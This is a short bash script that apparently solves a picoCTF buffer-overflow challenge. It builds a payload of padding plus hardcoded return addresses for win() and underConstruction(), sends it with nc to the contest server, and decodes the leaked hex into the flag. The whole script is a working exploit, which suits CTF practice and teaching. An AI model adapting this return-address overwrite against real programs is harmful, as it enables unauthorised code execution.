#!/bin/bash

u="\x20\x9e\x04\x08" #underConstruction() offset
win="\xa0\x9d\x04\x08" #win() offset
payload="AAAAAAAAAAAAAA"${win}${u}${u}${u}${u}${u}

echo $payload
echo

#ret=$(./vuln_ < <(echo -en "$payload"))
ret=$(echo -e "$payload" | nc saturn.picoctf.net 53806)

hexstream=$(echo $ret | sed "s/User information : \|Age of user: \|Names of user: //g" | sed "s/ 0x//g")
echo $hexstream | cut -d' ' -f 15 | xxd -r -p | grep -aEo "}[^{]+{FTCocip" | rev


echo a